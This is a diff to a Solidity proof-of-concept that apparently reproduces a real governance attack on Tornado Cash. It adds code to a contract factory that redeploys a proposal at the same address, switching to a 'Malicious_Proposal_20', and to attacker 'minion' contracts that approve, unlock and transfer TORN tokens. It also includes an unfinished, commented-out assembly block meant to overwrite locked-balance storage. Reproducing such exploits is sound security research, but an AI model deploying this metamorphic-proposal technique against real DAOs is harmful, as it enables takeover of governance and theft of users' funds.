@@ -19,6 +19,7 @@ contract ReinitializableContractFactory is Ownable {
     address public proposal;
     address public transient;
     bool public deployMaliciousProposal;
+    address public minionFactory;
 
     /**
      * @dev Modifier to ensure that the first 20 bytes of a submitted salt match
@@ -26,6 +27,7 @@ contract ReinitializableContractFactory is Ownable {
      * being stolen by frontrunners or other attackers.
      * @param salt bytes32 The salt value to check against the calling address.
      */
+
     modifier containsCaller(bytes32 salt) {
         require(
             address(bytes20(salt)) == msg.sender,
@@ -41,14 +43,15 @@ contract ReinitializableContractFactory is Ownable {
     // More details:
     // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
     // Method called after: 0xce40d339 in the attacker's contract factory
-    function createProposalWithTransient(bytes32 _salt, bool _deployMaliciousProposal)
+    function createProposalWithTransient(bytes32 _salt, bool _deployMaliciousProposal, address _minionFactory)
         public
         payable
         containsCaller(_salt)
         returns (address proposalContractAddress, address deployedTransientContract)
     {
-        // Write the global
+        // Write the globals
         deployMaliciousProposal = _deployMaliciousProposal;
+        minionFactory = _minionFactory;
 
         // determine the address of the transient contract.
         address transientContractAddress = getTransientContractAddress(_salt);
@@ -129,11 +132,14 @@ contract TransientContract is Ownable {
         // retrieve the target implementation address from creator of this contract.
         address proposalContractAddress;
         bool deployMalicious = IReinitializableContractFactory(msg.sender).deployMaliciousProposal();
+        address minionFactory = IReinitializableContractFactory(msg.sender).minionFactory();
 
-        if (deployMalicious) {
+        if (!deployMalicious) {
+            console2.log("Deploying initial proposal...");
             proposalContractAddress = address(new Proposal_20());
         } else {
-            proposalContractAddress = address(new Malicious_Proposal_20());
+            console2.log("Deploying malicious proposal...");
+            proposalContractAddress = address(new Malicious_Proposal_20(minionFactory));
         }
 
         // ensure that the proposal contract was successfully deployed.
@@ -197,6 +203,12 @@ contract Proposal_20 is Ownable {
 }
 
 contract Malicious_Proposal_20 is Ownable {
+    address immutable minionFactory;
+
+    constructor(address _factory) {
+        minionFactory = _factory;
+    }
+
     function getNullifiedTotal(address[4] memory relayers) public returns (uint256) {
         uint256 nullifiedTotal;
 
@@ -230,6 +242,22 @@ contract Malicious_Proposal_20 is Ownable {
         IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);
 
         // Added code to sstore over the lockedBalance mapping the new value for the minions
+        address[] memory minions = Attacker1Contract(minionFactory).getMinions();
+        // =============== WIP ===============
+        // We need to calculate the lockedBalanceSlot so we can then calculate the offset for each minion
+
+        // for (uint256 i = 0; i < minions.length; i++) {
+        //     console2.log(minions[i]);
+        //     address curMinion = minions[i];
+        //     uint256 amount = 10_000 ether;
+        //     uint256 lockedBalanceSlot;
+        //     assembly {
+        //         mstore(0, curMinion)
+        //         mstore(32, lockedBalanceSlot)
+        //         let hash := keccak256(0, 64)
+        //         sstore(hash, amount)
+        //     }
+        // }
     }
 
     function emergencyStop() public onlyOwner {
@@ -240,14 +268,18 @@ contract Malicious_Proposal_20 is Ownable {
 
 contract Attacker1Contract {
     IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
-    address[] minionContracts;
+    address[] internal _minionContracts;
+
+    function getMinions() public view returns (address[] memory) {
+        return _minionContracts;
+    }
 
     function deployMultipleContracts(uint256 amount) external {
         address newMinion;
         for (uint256 i = 0; i < amount;) {
             console2.log("Deploying and preparing minion #%s", i + 1);
             newMinion = address(new Attacker1Minion());
-            minionContracts.push(newMinion);
+            _minionContracts.push(newMinion);
 
             tornToken.transferFrom(msg.sender, newMinion, 0);
             Attacker1Minion(newMinion).attackTornado(Attacker1Minion.AttackInstruction.APPROVE);
@@ -260,9 +292,9 @@ contract Attacker1Contract {
     }
 
     function triggerUnlock() external {
-        uint256 amountOfMinions = minionContracts.length;
+        uint256 amountOfMinions = _minionContracts.length;
         for (uint256 i = 0; i < amountOfMinions;) {
-            address currentMinion = minionContracts[i];
+            address currentMinion = _minionContracts[i];
             Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.UNLOCK);
             Attacker1Minion(currentMinion).attackTornado(Attacker1Minion.AttackInstruction.TRANSFER);
 
